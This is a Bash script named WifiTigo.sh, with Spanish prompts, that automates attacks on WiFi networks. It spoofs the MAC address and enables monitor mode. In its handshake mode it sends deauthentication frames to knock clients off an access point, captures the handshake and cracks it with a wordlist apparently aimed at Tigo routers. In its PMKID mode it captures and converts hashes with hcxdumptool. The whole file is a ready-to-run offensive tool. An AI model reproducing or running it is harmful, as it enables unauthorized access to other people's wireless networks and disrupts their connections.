#!/bin/bash

#Autor LAFASSJ

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

export DEBIAN_FRONTEND=noninteractive

trap ctrl_c INT

function ctrl_c(){
	echo -e "\n${yellowColour}[*]${endColour}${grayColour}Saliendo${endColour}"
	tput cnorm; exit 0
	airmon-ng stop $networkCard > /dev/null 2>1&
        systemctl start wpa_supplicant.service
        systemctl start NetworkManager.service
	rm Captura* 2> /dev/null

}

function helpPanel(){
	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Uso ./WifiTigo.sh${endColour}"
	echo -e "\t${blueColour}-a${endColour}${grayColour} Modo de ataque${endColour}"
	echo -e "\t\t${redColour}Handshake${endColour}"
	echo -e "\t\t${redColour}PKMID${endColour}"
	echo -e "\t${blueColour}-n${endColour}${grayColour} Nombre de la interfaz de red${endColour}"
	echo -e "\t${blueColour}-h${endColour}${grayColour} Panel de Ayuda${endColour}\n"
	exit 0
}

function dependencies(){
	tput civis
	clear; dependencies=(aircrack-ng macchanger)

	echo -e "${yellowColour}[*]${endColour}${grayColour} Comprobando programas necesarios ...${endColour}"
	sleep 3
	for program in "${dependencies[@]}";do
	    echo -e "\n${yellowColour}[*]${endColour}${blueColour}Herramienta${endColour}${purpleColour} $program${endColour}${blueColour}...${endColour}"

	test -f /usr/bin/$program

	if [ "$(echo $?)" == "0" ]; then
	    echo -e "${greenColour}(V)${endColour}"
 
	else
	    echo -e "${redColour}(X)${endColour}"
	    echo -e "${yellowColour}[*]${endColour}${grayColour} Instalando herramienta ${endColour}${blueColour}$program${endColour}"
	apt-get install $program -y > /dev/null 2>&1

	fi; sleep 1

	done

}

function startAttack(){
		clear
		echo -e "${yellowColour}[*]${endColour}${grayColour} Configurando tarjeta de red...${endColour}\n"
		airmon-ng start $networkCard > /dev/null 2>1&
		ifconfig $networkCard down && macchanger -a $networkCard > /dev/null 2>1&
		ifconfig $networkCard up; killall dhclient wpa_suplicant 2>/dev/null

		echo -e "${yellowColour}[*]${endColour}${grayColour} Nueva dirección MAC asignada ${endColour}${purpleColour}[${endColour}${blueColour}$(macchanger -s $networkCard | grep -i current | xargs | cut -d ' ' -f '3-100')${endColour}${purpleColour}]${endColour}"

	if [ "$(echo $attack_mode)" == "Handshake" ]; then
		xterm -hold -e "airodump-ng $networkCard" &
		airodump_xterm_PID=$!
		echo -ne "${yellowColour}[*]${endColour}${grayColour} Nombre del Wifi ${endColour}" && read apName
		echo -ne "${yellowColour}[*]${endColour}${grayColour} Canal del Wifi ${endColour}" && read apChannel

		kill -9 $airodump_xterm_PID
		wait $airodump_xterm_PID 2>/dev/null

		xterm -hold -e "airodump-ng -c $apChannel -w Captura --essid $apName $networkCard" &
		airodump_filter_PID=$!

		sleep 5; xterm -hold -e "aireplay-ng -0 10 -e $apName -c FF:FF:FF:FF:FF:FF $networkCard" &
		aireplay_xterm_PID=$!
		sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null

		sleep 10; kill -9 $airodump_filter_PID
		wait $airodump_filter_PID 2>/dev/null

		xterm -hold -e "aircrack-ng -w DiccionarioTIGO.txt Captura-01.cap" &
	elif [ "$(echo $attack_mode)" == "PKMID" ]; then
	clear; echo -e "${yellowColour}[*]${endColour}${grayColour}Iniciando Captura del archivo .hc22000${endColour}\n"
	sleep 2
	timeout 240 bash -c "hcxdumptool -i $networkCard -o dumpfile.pcapng --active_beacon --enable_status=15"
	echo -e "${yellowColour}[*]${endColour}${grayColour}Convirtiendo archivo..{endColour}\n"
	sleep 2
	hcxpcapngtool -o hash.hc22000 -E wordlist dumpfile.pcapng
	sleep 5
	echo -e "${yellowColour}[*]${endColour}${grayColour}Archivo guardado con exito{endColour}\n"

	else
	echo -e "${redColour}[*] Este modo de ataque no es valido${endColour}\n"
	exit 1

	fi
}


# Funcion Principal

if [ "$(id -u)" == "0" ]; then
    declare -i parameter_counter=0; while getopts ":a:n:h" arg; do
	case $arg in
		a) attack_mode=$OPTARG; let parameter_counter+=1;;
		n) networkCard=$OPTARG; let parameter_counter+=1;;
		h) helpPanel;;
	esac
    done

	if [ $parameter_counter -ne 2 ]; then
	    helpPanel
	else
	dependencies
	startAttack
	tput cnorm
	airmon-ng stop $networkCard > /dev/null 2>1&
	systemctl start wpa_supplicant.service
	systemctl start NetworkManager.service
#	rm Captura* 2> /dev/null
	fi

else
	echo -e "\n${redColour}[*] No soy root${endColour}\n"

fi
